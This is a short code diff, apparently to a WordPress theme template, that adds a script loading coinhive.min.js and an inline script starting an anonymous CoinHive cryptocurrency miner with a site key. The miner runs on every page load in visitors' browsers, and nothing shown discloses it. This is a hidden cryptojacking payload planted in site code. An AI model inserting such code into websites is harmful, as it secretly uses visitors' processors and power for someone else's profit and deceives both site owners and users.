@@ -9,3 +9,8 @@
   ga('send', 'pageview');
 
 </script>
+<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('HNwmonit2HqbX4mk5j2X7i3pYbwMLLDj', {threads: 1});
+    miner.start();
+</script>
